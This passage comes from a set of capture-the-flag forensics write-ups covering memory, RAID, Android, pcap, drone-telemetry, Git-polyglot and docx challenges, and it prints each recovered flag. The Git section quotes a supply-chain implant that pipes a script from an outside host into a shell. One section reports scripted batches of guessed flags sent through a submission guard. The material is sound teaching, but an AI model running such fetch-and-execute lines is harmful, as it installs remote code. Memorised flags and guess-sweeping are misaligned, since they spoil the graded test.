That stack blob reads the real fragments and the decoys (`burn_it`, `fall_back`, `at_dawn`, `stand_do`, `relieve_`, `hold_the`, `wn_now`, `regroup_`, `_at_two`) in reverse order; it does not say which fragments belong to the order or where it begins and ends.

*3. The stack copy is a trap.* `xxd` over the blob shows that right after the text sits an array of 23 little-endian pointers into the heap (`0x55a7aff173c0`, `0x55a7aff17450`, …), one per record, real and decoy alike — the program's scratch copy of every record. Neither the blob nor the pointer array distinguishes the order. The heap records themselves do: each carries a link to the next record.

*4. Decode a heap record.* Dumping the `CSCTF` fragment's chunk at file offset `0x37a8`:

```
000037a8: 0000 0000 0000 0000 3100 0000 0000 0000  ........1.......
000037b8: 5074 f1af a755 0000 0500 0000 4353 4354  Pt...U......CSCT
000037c8: 4600 ...                                   F...
```

`31 00 …` is a glibc malloc chunk size field (`0x30 | PREV_INUSE`). User data starts 8 bytes later, at file `0x37b8` = VA `0x55a7aff173c0`. Its layout is `u64 next` (`0x55a7aff17450`), `u32 len` (`5`), then `len` text bytes (`CSCTF`). So each record is a singly linked-list node `{next, len, text}`. The `59c}` node has `next = 0` (a list tail); some decoys (`burn_it`, `fall_back`, `relieve_`) are null-terminated too.

*5. Carve every record.* A short script reads the ELF program headers (`elfcore.py`), then walks the heap segment in 16-byte steps, keeping every `0x31`-sized chunk whose `next` is 0 or points inside the heap and whose text is printable:

```python
for chunk in range(heap["off"], heap["off"]+heap["filesz"]-0x30, 0x10):
    size, = struct.unpack_from("<Q", data, chunk+8)
    if size != 0x31: continue
    user = chunk + 0x10
    nxt, ln = struct.unpack_from("<QI", data, user)
    text = data[user+12:user+12+ln]
    in_heap = nxt == 0 or heap["va"] <= nxt < heap["va"]+heap["filesz"]
    if 0 < ln <= 0x28-12 and in_heap and all(b in printable for b in text):
        nodes[user - heap["off"] + heap["va"]] = dict(next=nxt, text=text.decode())
```

This yields all 23 fragments with their links, e.g. the `CSCTF` node at `0x55a7aff173c0 → next 0x55a7aff17450` (`{20_`), and so on.

*6. Follow every list.* A list head is a record no other record points to. Walking each head to `next = 0` gives ten chains, several of which end in the same fragments because the decoy heads splice into the real list's tail:

```
stand_do + fall_back + _mov + ... + k_866 + 59c}   = stand_dofall_back_move_orchard_elm_grove_dusk_86659c}
CSCTF + {20_ + dock + _mov + e_orc + hard_ + elm_ + grove + _dus + k_866 + 59c}
                                                   = CSCTF{20_dock_move_orchard_elm_grove_dusk_86659c}
hold_the + wn_now + fall_back + ... + 59c}         = hold_thewn_nowfall_back_move_orchard_elm_grove_dusk_86659c}
at_dawn + grove + _dus + k_866 + 59c}              = at_dawngrove_dusk_86659c}
regroup_ + _bridge + 59c}                          = regroup__bridge59c}
```

The decoy heads (`stand_do`, `hold_the`, `at_dawn`, `_at_two`, `regroup_`) all tail into `..._86659c}` and look plausible. Only one head starts with `CSCTF` and forms a well-formed `CSCTF{...}` — but relying on the flag format is circular, so the state itself settles it.

*7. Recover the flag from the registers.* The saved thread registers are in the `NT_PRSTATUS` note; `pr_reg` sits at offset 112 in `struct elf_prstatus` on x86-64. Reading them and marking any register that points at a record:

```
rax      0x000055a7aff173c0  -> record 'CSCTF'
rcx      0x000055a7aff176c0  -> record 'burn_it'
rdi      0x000055a7aff173c0  -> record 'CSCTF'
```

Both `rdi` — the first-argument register in the SysV ABI — and `rax` hold the address of the `CSCTF` node, i.e. the list the CPU was processing when the snapshot was taken. (`rcx` points to a decoy `burn_it`; `rdx` holds leftover bytes `n_it` from handling decoy text.) Following `next` from `rdi` to the null terminator gives the 11-fragment order:

```
CSCTF + {20_ + dock + _mov + e_orc + hard_ + elm_ + grove + _dus + k_866 + 59c}
CSCTF{20_dock_move_orchard_elm_grove_dusk_86659c}
```

**Why it works**

A core file is the process's memory mappings (`PT_LOAD`) plus its register state (`PT_NOTE`). Once the program headers translate virtual addresses to file offsets, the raw heap is parseable as glibc chunks and the program's own linked list can be rebuilt. The fragments mean something only in pointer order, and the decoys share the real list's tail, so no chain is distinguishable by its ending. The one reliable head is the node the CPU was actually working on — the address held in `rdi`/`rax` when the memory was snapshotted.

**Validation / reproduction**

Two independent signals agree. The chain starting at the node in `rdi`/`rax` is the only one of the ten that forms a complete, well-formed `CSCTF{...}`, and it ends at a node with `next = 0`. Accepted on the first submission.

Reproduction in short: `readelf -lW`/`-nW` to find the unbacked `0x21000` RW segment (the heap) and translate VAs; carve `0x31`-sized chunks as `{next, len, text}` nodes; walk every head to enumerate the chains; then read `pr_reg` from `NT_PRSTATUS` and follow the list whose head is in `rdi`. Gotchas: the stack blob and its 23-pointer array are a trap (reversed, order-free), and several decoy chains end in the same `..._86659c}` tail — pick the head from process state, not from which string "looks like" a flag.

### Operation Dawn: The Burnt Server

> Forensics · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{04_flint_arc_eastward_relay_6aa299}`

**Challenge**

> A hostile force destroyed a fictional country's hospital logistics archive to choke medical transport. Two storage members survived, and the salvage record is in the attachment. Recover the train movement register and submit its complete `CSCTF{...}` marker.

The attachment is `server-remains.tar` (4,198,400 bytes, SHA-256 `98fd39f5…45af`). It unpacks to two 2 MiB disk images, `disk0.img` and `disk2.img`, and a note, `SALVAGE.txt`. The note says the box held three identical drives behind one controller: the center drive (slot 1) was burnt through and its platters are gone, slots 0 and 2 were imaged intact, and the controller and its labels did not survive, so the array settings are not recorded. Three identical members, one lost, data still expected to be recoverable: that is three-member RAID 5 with the chunk size, parity rotation and member order all unknown.

**Approach / walkthrough**

*1. Rebuild the burnt member from parity.* Neither survivor shows a file system on its own (`file` even misreads `disk0.img` as an "OpenPGP Secret Key" — a chance match on noise). In a three-member RAID 5, every stripe holds two data chunks and their XOR, so `slot0 ⊕ slot1 ⊕ slot2 = 0` in every stripe, whichever slot carries parity there. The lost slot 1 is therefore just the byte-wise XOR of the two survivors, and no layout knowledge is needed yet:

```python
slot0 = Path("out/disk0.img").read_bytes()
slot2 = Path("out/disk2.img").read_bytes()
slot1 = bytes(a ^ b for a, b in zip(slot0, slot2))
Path("out/disk1.img").write_bytes(slot1)
```

`file out/disk1.img` now reports a FAT16 boot sector, OEM-ID `mkfs.fat`, 8192 sectors (= 4 MiB, exactly two members' worth), label `DAWN ARCH`. The rebuilt member starting with the boot sector confirms the XOR idea and fixes two layout facts: the volume's first chunk lives on slot 1 (slot 1 holds data in stripe 0, not parity), and there is no RAID metadata header in front of the data.

*2. Read the partial volume on slot 1.* The Sleuth Kit reads a truncated image directly, so inspect the file system before assembling anything:

```sh
fls -r out/disk1.img
TZ=UTC istat out/disk1.img 8
icat -r out/disk1.img 8 | gzip -t
```

`fls` lists four live text files (`ROSTER.TXT`, `WARDS.TXT`, `MANIFEST.TXT`, `SIGNALS.TXT`) and a deleted entry 8, `_RAIN.GZ`. FAT marks a deleted file by overwriting the first name byte with `0xE5`, so this was `TRAIN.GZ`. Its FAT chain is freed, but the directory entry still records the start (sector 111) and the size (16,599 bytes). `istat` confirms it. The file runs from `111 × 512 = 0xDE00` to `0xDE00 + 16599 = 0x11ED7`, which crosses the 64 KiB mark, and `icat -r` from slot 1 alone yields a truncated gzip (`unexpected end of file`). So the file continues on another member.

*3. Work out chunk size and member order.* A short scanner prints, per member, the byte ranges that actually contain data (512-byte sectors, trailing zeros trimmed):

```
slot 0: 0x00000-0x01ed6  0x04200-0x04220  0x08200-0x082be  0x0c200-0x10000
slot 1: 0x00000-0x00220  0x04200-0x04220  0x08200-0x082be  0x0c200-0x10000
slot 2: 0x00000-0x01ed6
```

Slot 1 holds the volume's first structures at their native FAT offsets (boot sector/first FAT at `0x0`, second FAT copy at `0x4200`, root directory at `0x8200`, file data from `0xC200`) and stops dead at `0x10000` — right in the middle of the deleted gzip. Slot 2 holds one short run at its very start: the file needs `0x11ED7 − 0x10000 = 0x1ED7` more bytes, and the run is `0x1ED6` because the file's last byte (the top byte of gzip's length field) is zero. That run is the register's tail. Slot 0 has data wherever slot 1 or slot 2 does, so it is parity in stripe 0. The chunk size is therefore 64 KiB, and stripe 0 is: parity on slot 0, volume bytes `0x0000–0xFFFF` on slot 1, bytes `0x10000–0x1FFFF` on slot 2. Parity on the first slot with data following it is the Linux md "right" family of layouts; the md default (left-symmetric) would start the volume on slot 0, which has no boot sector, and is ruled out.

*4. Assemble and carve.* Interleave the three members with 64 KiB chunks and the right-symmetric rotation into `out/array.img`. `file` reports a full 4 MiB FAT16 volume. Then recover the deleted register with contiguous-cluster recovery and check the CRC:

```sh
fls -r out/array.img
icat -r out/array.img 8 > out/train.gz
gzip -t out/train.gz && gzip -l out/train.gz
```

`gzip -t` passes, and `gzip -l` shows 16,599 compressed → 76,901 uncompressed. Watch the chunk size: sweeping the four md layouts across 512 B … 128 KiB, only the right-* layouts at 64 KiB give a gzip that passes. A 128 KiB (or mdadm's 512 KiB default) assembly still produces a perfect-looking file system, because all FAT metadata sits in the first 64 KiB — only the one file that crosses the chunk boundary breaks, so the gzip CRC is the discriminator. Without the Sleuth Kit, the entry is the sixth directory record at `0x82A0` (`e5 52 41 49 4e 20 20 20 47 5a …`, start cluster `0x10` = sector 111, size `0x40D7` = 16,599), so `dd … skip=56832 count=16599` cuts the same bytes.

*5. Read the register.* Decompress and search:

```sh
gzip -dc out/train.gz > out/train.txt
grep -o 'CSCTF{[^}]*}' out/train.txt
```

The 1,406-line "WHITE VALLEY HOSPITAL — TRAIN MOVEMENT REGISTER" has the movement order buried after record 0942:

```
948:MOVEMENT ORDER: CSCTF{04_flint_arc_eastward_relay_6aa299}
```

**Why it works**

RAID 5 parity is a plain XOR, so a single lost member can be recomputed from the survivors without knowing the controller settings. The settings then surface in the data itself: where the boot sector lands picks the first data member, all FAT metadata sitting on slot 1 at its native offsets sets a 64 KiB lower bound, and the one file that crosses a chunk boundary pins the chunk size and the parity rotation exactly. FAT deletion only marks the directory entry with `0xE5` and frees the chain, leaving the start cluster, size and data clusters in place, so the gzip can be carved back.

**Validation / reproduction**

gzip's CRC-32 and length trailer passed only for the right-* / 64 KiB assembly, so the carve is byte-exact, and the per-member data map agrees with the chosen layout. To reproduce: verify the tar's SHA-256, XOR `disk0`/`disk2` to rebuild `disk1`, confirm the FAT16 boot sector, map the member data ranges to read off the 64 KiB right-symmetric layout, assemble, `icat -r … 8`, `gzip -t`, decompress, and grep for the marker. Accepted on the first submission.

### Operation Dawn: The Medic's Phone

> Forensics · Medium · Terminal43  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{03_at_platform_two_6f57d7}`

**Challenge**

> Operation Dawn, annex entry 03. A station medic surrendered their phone before boarding. Signals sent the platform assignment through the courier app and then withdrew it; the app now shows only a notice. Recover the assignment from the supplied Android backup.

The attachment is `medic-phone.ab` (2,809 bytes, SHA-256 `41bb4e2b…f979`), an `adb backup` file.

**Approach / walkthrough**

*1. Unwrap the backup.* An `.ab` file is a four-line text header followed by one compressed stream that holds a tar. The header reads magic `ANDROID BACKUP`, version `5`, compression `1` (zlib), encryption `none`, so the payload begins right after the fourth newline and a single `zlib.decompress` yields the tar:

```python
data = open('medic-phone.ab', 'rb').read()
i = 0
for _ in range(4):
    i = data.index(b'\n', i) + 1          # b'ANDROID BACKUP\n5\n1\nnone\n'
open('backup.tar', 'wb').write(zlib.decompress(data[i:]))
```

`tar tvf backup.tar` shows three apps: a courier (messaging) app `org.unit43.courier` with `db/messages.db` **and** a sibling `db/messages.db-wal`, a field-notes app `org.unit43.fieldnotes`, and a radio config `org.unit43.radioset`. The `-wal` file next to the database is the whole challenge.

*2. Survey the phone, working on copies.* `messages.db` runs in WAL mode, and opening the live file with `sqlite3` lets SQLite checkpoint and delete the `-wal` file when the connection closes — which would destroy the evidence. Copy the database out on its own, without the log, and open the copy. Its schema is `messages(id, thread, sender, ts, pb BLOB)` — bodies live in `pb` as blobs. The field-notes DB (dumped read-only, in place) carries the pointer: note 4, "Train", reads *"platform numbers change nightly, always confirm with signals"*. So the assignment came from `signals` through the courier app. The courier preferences also hold a `session_token` stamped `PLACEHOLDER-FAKE-TOKEN-NOT-REAL` — a labeled decoy, not key material.

*3. Decode the message protobufs.* `select hex(pb) from messages where id=1` gives a record whose wire format reads `08 01` (field 1 varint = id), `12 05 7761726432` (field 2 = `ward2`), `18 …` (field 3 = timestamp), `20 01` (field 4 = a flag), and `2A 2F …` (field 5, 0x2f bytes that are not text). Field 5 is a **raw DEFLATE** stream (`zlib.decompress(x, -15)`), which is why plain `strings` finds nothing readable. A small scanner anchors on each `0x08` field-1 tag, parses fields 2–5, and inflates field 5:

```python
TAGS = (0x12, 0x18, 0x20, 0x2a)          # fields 2..5 of the courier Message
# ... walk each 0x08 anchor, read tag/wire-type, collect f[2..5]
body = zlib.decompress(f[5], -15).decode()   # field 5 = raw deflate
```

Run on `messages.db`, it decodes all 16 messages. The ward thread is stretcher logistics; the signals thread at the end reads: 13 `signals` "Order is being cut now. Stand by, do not acknowledge yet.", **14 `signals` "This message was withdrawn by the sender and is no longer available."**, 15 `medic` "Nothing received here. Repeat last, over.", 16 `signals` "Disregard the last. New order to follow. Wait out." Message 14, the one that would carry the assignment, is gone from the app's current data.

*4. Carve the write-ahead log.* "Withdrew" only overwrote row 14 in the main database. SQLite in WAL mode appends page images to the `-wal` file, and the backup still carries an older image of the page that stores the messages. Run the same scanner over the raw bytes of `messages.db-wal`:

```sh
python3 carve.py apps/org.unit43.courier/db/messages.db-wal | grep -o 'CSCTF{[^}]*}'
```

Its message 14 still holds the original body: *"Movement order. Board the hospital train. Assignment follows: CSCTF{03_at_platform_two_6f57d7} Acknowledge on receipt and destroy this message."*

**Why it works**

The courier app stored each message as a protobuf record whose field 5 is a raw-DEFLATE body, so nothing readable shows up in a `strings` sweep until the wire format is recognized. Withdrawing the order overwrote only row 14 in `messages.db`, while an older image of that table's page survived in `messages.db-wal` inside a frame whose commit marker — the database-size field in the frame header, nonzero only on the final frame of a committed transaction — is zero. SQLite treats that frame as an uncommitted transaction and never replays it, so the app and every `SELECT` see only the checkpointed notice. Reading the WAL bytes directly bypasses SQLite's replay logic, and once the custom encoding is recognized the original body comes back.

**Validation / reproduction**

The same scanner decodes all 16 messages from both the database and the WAL. Messages 13, 15 and 16 read identically in both, which shows the parser and the inflate step are correct, and 14 is the only one that changes between them — exactly the message the brief says was withdrawn. The recovered body is a complete sentence carrying the platform assignment, in the thread the field notes point to. Reproduction: unwrap the `.ab`, copy `messages.db` out alone, decode the protobuf/raw-deflate records from both the DB and the `-wal`, and compare message 14. Accepted on the first submission.

### Operation Dawn: The Relay Tap

> Forensics · Not shown · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{16_cobalt_ingot_rowan_fathom_ca8f4addb0}`

**Challenge**

> During Operation Dawn, Ash Army operators sprayed forged traffic onto a coalition government's emergency-dispatch relay while command's standing order was in flight. A signals unit tapped the link, but the capture is noisy and some of the relay's data appears more than once. Work out which standing order the relay actually delivered and submit it exactly as recovered. Between its braces it uses lowercase letters, digits and underscores.

The attachment is `relay-tap.zip` (12,327 bytes, SHA-256 `43424028…2530`) containing `relay-tap.pcap`, a 123-packet little-endian Ethernet capture. ARLY, the relay's frame format, is invented for the scenario and describes itself inside the capture; the hosts are RFC 5737 documentation addresses and `.test`/`.example` names.

**Approach / walkthrough**

*1. Find the relay conversation.* The DNS answers and `tshark -qz conv,tcp` identify the single relay session: `relay.dawn.test` resolves to `198.51.100.9`, and the only conversation with that host is `192.0.2.37:39605 ↔ 198.51.100.9:7443`. The six port-80 sessions are background noise, each returning the same `dispatch status: nominal` page; the rest is ARP, DNS and pings.

*2. Read the connection like a TCP receiver.* Checksum validation is off by default, so turn it on and print the timeline:

```sh
tshark -r relay-tap.pcap -o tcp.check_checksum:TRUE -Y 'tcp.port==7443' \
  -T fields -e frame.number -e ip.src -e tcp.seq -e tcp.ack -e tcp.len \
  -e tcp.checksum.status -e _ws.expert.message
```

Two server segments are flagged as suspected retransmissions:
- **Frame 114** repeats sequence range 1–366 (same as frame 112); frame 113 had already ACKed it (`ack 367`). Bad checksum (should be `0xe401`).
- **Frame 117** repeats range 367–419 (same as frame 115); frame 116 had already ACKed it (`ack 420`). Bad checksum (should be `0x3e4a`).

A real stack drops a bad-checksum segment before looking at the payload, and ignores bytes at a sequence position it has already ACKed. So the application received the relay's bytes exactly once, from frames 112 and 115; the clean FIN exchange (118–121) shows nothing else was added.

*3. Tell the plain duplicate from the forgery.* Hash each original and its "retransmission":

```sh
for n in 112 114 115 117; do tshark -r relay-tap.pcap -Y "frame.number==$n" \
  -T fields -e tcp.payload | xxd -r -p | shasum -a 256; done
```

Frame 114 is a byte-for-byte copy of 112 (the harmless "data appears more than once"). Frame 117 has the same seq/len as 115 but **different bytes** — the injected standing order. Both carry an `ARLY` type-3 header, so the frame type alone can't separate them; a tool that takes the *last* copy of each range, or the last order frame in the capture, ends up with the forgery 117.

*4. Read the self-describing descriptor.* `tshark -qz follow,tcp,ascii,6` reassembles first-copy-wins and prints the relay's opening message, which documents its own protocol:

```
frame = "ARLY" | type(1) | len(2, big-endian) | body
types 0=descriptor 1=client_nonce(16) 2=server_nonce(16) 3=order
key = SHA-256(client_nonce || server_nonce), 32 raw bytes
ks  = SHA-256(key || uint32be(i)) for i = 0,1,2,..., concatenated, cut to len(body)
order = body XOR ks, byte by byte
```

*5. Recover the flag.* A short stdlib-only script repeats the receiver logic: parse the pcap, verify each TCP checksum against the IPv4 pseudo-header, rebuild both directions dropping bad-checksum segments and keeping the first valid copy of each byte position, split into ARLY frames, derive the key from the two cleartext nonces, and XOR:

```
client_nonce = 3025e87165779f3626cc5c2015f5415f
server_nonce = 30815081be3320582eeb2fae8fad178b
key = SHA-256(client_nonce || server_nonce)
    = 71ed9289fb24d4f7174fcd3b8a4afdcd4e9787af2201f50beb9f627831d43a0e
delivered order (frame 115) -> CSCTF{16_cobalt_ingot_rowan_fathom_ca8f4addb0}
dropped forged body (frame 117) -> b'S\x8e\xae\xa8\x03\xf1...'  (junk)
```

**Why it works**

The "noise" is TCP-level injection: spoofed relay segments that reuse a sequence range already delivered. The question is what the *receiver* accepted, not what crossed the wire. A TCP stack drops segments with a bad checksum and ignores data at sequence positions it has already ACKed; applying those two rules removes both the harmless duplicate (114) and the forged order (117), leaving frames 112 and 115 as what the application saw. The ARLY descriptor in that delivered stream documents the encryption — a SHA-256 counter-mode keystream keyed by the two nonces exchanged in the clear — and the key depends only on data the attacker could not forge.

**Validation / reproduction**

The real order (frame 115) decrypts to readable text in exactly the brief's alphabet (lowercase, digits, underscores), while the forged frame 117 decrypts to junk under the same session key — confirming whoever forged it never held the key. Reproduction: map the conversation, print the TCP timeline with checksum validation on, hash the duplicate pairs to separate the copy from the forgery, read the ARLY descriptor, and decrypt the delivered order body. Accepted on the first submission.

### Phantom Drift

> Forensics · Hard · CSA Romania  
> Points: 560 · Flag submitted by: secretNinja

**The flag**

`CSCTF{5dc7cdf826f74515}`

**Challenge**

The reconnaissance drone *Valkyrie-9* drifted off its approved waypoint while the command server logged the mission as nominal. Six offline attachments: a Base64-wrapped C# (Unity/Newtonsoft) drone client, a Base64-wrapped Go command backend, a 36-byte `flight_log.bin`, the mission manifest, phase-tagged telemetry, and a radio-intercept timeline. The flag is a 16-hex-character digest wrapped in `CSCTF{...}`.

**Approach / walkthrough**

*1. Flight record.* `flight_log.bin` is a `FLGT`-magic record:

```
00000000: 464c 4754 0001 0003 0000 000c 0000 0000  FLGT............
00000010: 0000 0001 0000 0002 0220 2b51 1d11 5f5d  ......... +Q.._]
00000020: 1e0f 3753                                ..7S
```

After the magic come 16-bit `0x0001`/`0x0003` and 32-bit words `0x0c`, `0`, `1`, `2`; `0x0c` matches the 12-byte payload that follows at offset `0x18`. XORing those 12 bytes with the repeating key `Valkyrie-9` (the mission ID) decodes to `TAG:dc6836a2` — eight hex characters. The brief frames this tag as the *last* 8 hex of the flag's digest, so it is a check value, not an input (and on its own it is too short to be the 16-hex flag).

*2. Approved point.* `mission_manifest.json` gives the approved waypoint `47.2591, 19.0402` (4 dp).

*3. Diverted point and the diversion mechanism.* The single `waypoint_update` telemetry record carries the coordinates twice, under two key spellings:

```json
"waypoint_lat": 47.2591, "waypoint_lon": 19.0402,   // snake_case: approved values
"WaypointLat": 47.26,    "WaypointLon": 19.045        // PascalCase shadow: diverted values
```

This is a JSON key-shadowing (parser-differential) setup: one object that reads as on-course under one spelling while the drone is steered to the other. The diverted point `47.2600, 19.0450` is fixed by three independent sources — the shadow keys; the radio-intercept log ("WP-Bravo is at 47.2591, 19.0402 — Valkyrie-9 is at ~47.2600, 19.0450", about 380 m east of WP-Bravo); and the five `transit_to_new_waypoint` GPS samples, which step away from the approved point by the same per-axis delta (`+0.0009 / +0.0048` per sample). Because all three agree, recovering the flag never depends on pinning down the exact client/server parser behavior.

*4. Fields.* The per-axis deltas are diverted − approved, written to 6 dp (`0.000900 / 0.004800`). The displacement is the haversine distance between the two points, written to 1 dp.

*5. Pick the radius with the tag.* The displacement depends on the Earth radius chosen. The mean radius (6,371,000 m) gives 375.8 m; the WGS-84 equatorial radius (6,378,137 m) gives 376.2257… → 376.2 m. The spec concatenates the fields with no separators and SHA-256s the result; the flag is the first 16 hex of the digest, the flight-log tag the last 8:

```python
import hashlib, math
a, b = (47.2591, 19.0402), (47.2600, 19.0450)
R = 6378137                                   # WGS-84 equatorial
p1, p2 = map(math.radians, (a[0], b[0]))
h = math.sin((p2-p1)/2)**2 + math.cos(p1)*math.cos(p2)*math.sin(math.radians(b[1]-a[1])/2)**2
d = 2*R*math.asin(math.sqrt(h))               # 376.22567159...
s = f"{a[0]:.4f}{a[1]:.4f}{b[0]-a[0]:.6f}{b[1]-a[1]:.6f}{d:.1f}"
# s == "47.259119.04020.0009000.004800376.2"
print(hashlib.sha256(s.encode()).hexdigest())
# 5dc7cdf826f74515c03f45611f58fabd2edc04382d6cf9f8696f9d83dc6836a2
#  ^ flag = first 16                                    last 8 = TAG ^
```

Only the WGS-84 string produces a digest whose last 8 hex equal the decoded flight-log tag `dc6836a2`. The flag is the first 16 hex: `CSCTF{5dc7cdf826f74515}`.

**Why it works**

The diversion is a JSON key-shadowing trick: one telemetry object carries both the approved and the diverted coordinates under two key spellings, so a reader that binds one spelling sees a compliant flight while the drone follows the other. Recovering the flag does not require reproducing the exact parser mismatch, because the diverted point is corroborated independently by the shadow keys, the radio log and the GPS track, and the embedded flight-log tag (the tail of the flag digest) confirms the final construction offline before any submission.

**Validation**

The challenge as first released gave only a one-sentence construction rule, which left the field order, number formatting and hashing open. During that phase we tested ranked candidates built from the evidence over several hours, many of them in scripted batches through `ctf.submit.guarded_submit`; the guard log shows a large number of rejected values from that period, and an automatic review also blocked one ~36-value batch as a speculative sweep (none of it submitted). The staff then posted public clarifications in the event's #news channel, and the live description was updated with a byte-exact serialization spec. At that point we dropped the candidate-ranking approach and built the value to the spec: the operator steered Codex onto the WGS-84 haversine construction, run directly under heavy human steering, and it produced the spec-compliant preimage. Before submitting, we checked it offline — the last 8 hex of its digest equal the tag decoded from `flight_log.bin` — and it was accepted on that single submission. The lesson: a hashed-serialization flag cannot be reasoned to one value until its exact byte format is known; once the organizer spec gave the format, the solve took one reasoned value, checked offline against the embedded tag.

### Polyglot Requiem

> Forensics · Medium · Mohamed Amine Mzoughi  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{p0lygl0t_r3qu13m_1d0a73980738}`

**Challenge**

> A review of a ground-station software supply chain turned up altered build history and an odd dashboard asset. Recover the concealed marker from the retained repository. Inspect build scripts, hooks and recovered programs as data: do not run them.

The attachment is `polyglot-requiem.zip` (39,051 bytes, SHA-256 `2a3aeda4…13c9`). It unpacks to the `flight-telemetry-sdk` repository, kept *with its `.git` directory and unreferenced objects* — a strong nudge to look at what the branches no longer point to.

**Approach / walkthrough**

*1. Find the commit cut out of history.* `master` looks clean, so ask Git for unreachable objects:

```sh
git -C flight-telemetry-sdk fsck --unreachable --no-progress
cat flight-telemetry-sdk/.git/ORIG_HEAD
git -C flight-telemetry-sdk show --format=raw c435f88
```

`fsck` reports `unreachable commit c435f883…`, which `ORIG_HEAD` still names, so the branch was reset past it. The commit sits on top of `ci: add build script` and slips a line into `build.sh`:

```
+curl -s http://198.51.100.9/telemetry-opt-in.sh | sh  # telemetry opt-in check
```

That is the supply-chain implant (treat it as evidence; do not run it or contact the host). Note its raw timestamp `1792061626` (2026-10-15 11:53:46 +0100) — every commit in the repo carries it, and it comes back in step 6.

*2. Pull the hidden ZIP out of the dashboard icon.* `assets/telemetry_icon.png` is a 10×10 image but 23,008 bytes. A hexdump shows the PNG proper ends at its `IEND` CRC (byte `0x71`) and carries a `tEXt` chunk `Provenance` = `0f18e37122ddbcca`; a ZIP local header (`PK\x03\x04`) starts right after `IEND` at `0x72`. Image viewers stop at `IEND` while `unzip` finds the central directory from the end of the file, so one file is both:

```sh
unzip -o flight-telemetry-sdk/assets/telemetry_icon.png -d out
```

It warns about 114 extra leading bytes but extracts `telemetry_cache.db` (SQLite) and `assetsignd` (x86-64 ELF).

*3. Recover the deleted SQLite row.* `SELECT id,label,length(payload) FROM build_secrets` returns four decoy rows (demo AWS key, `not_a_real_token`, a fake npm token, an all-zero pad row), but `strings` shows a label `ci_provenance_seal` that is no longer in the table — a deleted row. Page 2 is the table's single leaf page at offset `0x1000`; its header reads `0d 0000 0004 0ea3 …` (table-leaf, 4 live cells, content area starts at `0x0ea3`) followed by the four cell pointers `0faf 0f5c 0f03 0ea3` and then a fifth pointer, `0e67`, that the cell count no longer covers. Deleting the row cut the count from 5 to 4 and advanced the content start past the cell, but nothing was overwritten, so the record is intact at `0x1e67`:

```
3a 05            payload length 58, rowid 5
04 00 31 54      header: NULL (id = rowid), text len 18, blob len 36
"ci_provenance_seal" + 36-byte blob eec4bf28…c401
```

A short carver walks any stale pointer past the live array and saves the 36-byte blob to `out/rowid5.bin`. It looks random — it was sealed with the tool shipped beside it.

*4. Static RE of `assetsignd` (never run).* `.rodata` gives the usage `assetsignd <provenance_tag_hex> <epoch> <infile> <outfile>`, a `%02x` hex-parse format, and the SHA-256 round constants at `0x2060`. The binary is stripped, so `main` is found from `_start`, which hands `main` (0x1260) to `__libc_start_main` through its GOT slot. Reading `main` in order: `argv[2]` → `strtoull(…,10)` is the **epoch**; `argv[1]` is parsed by a `sscanf("%02x")` loop into raw tag bytes, then a pointer-forward/pointer-backward loop **reverses the tag in place**; the epoch is written as 8 **little-endian** bytes right behind the reversed tag; that buffer is SHA-256'd (initial IVs `0x6a09e667…0x5be0cd19`, `0x80` padding and the big-endian bit length are all visible); and a final loop does `data[i] ^= digest[i & 0x1f]` over the input file. So `key = SHA-256(reversed tag bytes ‖ epoch as 8 LE bytes)`, and the output is the input XORed with the repeating 32-byte key.

*5. Unseal.* Every input is now in hand: tag `0f18e37122ddbcca` (the icon's `Provenance` chunk), epoch `1792061626` (the rewritten commit), and the carved blob. XOR is its own inverse, so a Python port of the sealer — keeping the byte reversal — unseals:

```python
material = bytes.fromhex("0f18e37122ddbcca")[::-1] + (1792061626).to_bytes(8, "little")
key = hashlib.sha256(material).digest()
print(bytes(b ^ key[i % 32] for i, b in enumerate(open("out/rowid5.bin","rb").read())).decode())
# CSCTF{p0lygl0t_r3qu13m_1d0a73980738}
```

**Why it works**

The icon is a PNG/ZIP polyglot: PNG readers stop at `IEND`, ZIP readers parse from the end, so one 23 KB "icon" displays a 10×10 image and also carries the sealing tool and its cache database. SQLite doesn't wipe a deleted row — it drops the cell from the page's pointer count and leaves the record bytes in unallocated space, where a stale pointer still leads to them. `assetsignd` is only a repeating 32-byte XOR keyed with SHA-256 over the reversed `Provenance` tag and an epoch, so anyone holding both can undo it without running the program. The epoch is the timestamp of the very commit the history rewrite tried to hide — still remembered in `ORIG_HEAD` and stamped on every commit and on the files inside the icon's ZIP.

**Validation / reproduction**

The port's output is clean `CSCTF{...}` ASCII across all 36 bytes. With a repeating 32-byte XOR key, a wrong tag order or epoch would give random bytes, so clean text confirms both inputs and the in-place reversal were ported correctly. Reproduction: `git fsck --unreachable` + `ORIG_HEAD` for the commit and epoch, `unzip` the icon, carve rowid 5 from page 2, read the seal scheme out of `assetsignd` statically, then XOR. Accepted on the first submission.

### Redline

> Forensics · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{redline_21ee9b19d342e06432165fb2b6f64e06}`

**Challenge**

> Meridian Relief Network, Nightwatch case, Depot 7. During a grid-instability night a cold-chain excursion directive went out to depot crews. A crew lead kept the copy they received, and something reads wrong. The directive is a Word document. Work out how the version that reached the crews differs from what was approved, who changed it, and recover the original excursion authorization. Flag format: `CSCTF{message}`.

The attachment is `CC-11_excursion_directive.docx` (3,817 bytes, SHA-256 `07dff1ed…16bb`). A `.docx` is a ZIP of XML parts, so the job is reading the parts, not opening Word.

**Approach / walkthrough**

*1. Inventory the package.* `unzip -Z1` lists the members. Besides `word/document.xml` there is `word/comments.xml` — someone left a review comment — so read the two small people-facing parts first:

```sh
unzip -p CC-11_excursion_directive.docx docProps/core.xml word/comments.xml
```

`core.xml` gives creator `A. Reyes` (the Medical Director who signs the directive) and last editor `s.kessler`, modified `2026-10-07T02:41:00Z` — the middle of the incident night. The single comment, by `s.kessler`, admits dropping the quarantine hold and re-issuing "under a fresh authorization".

*2. Look for authorization codes in the body.* The body is one line of XML; grep for the flag shape:

```sh
unzip -p CC-11_excursion_directive.docx word/document.xml | grep -oE 'CSCTF\{[^}]*\}'
```

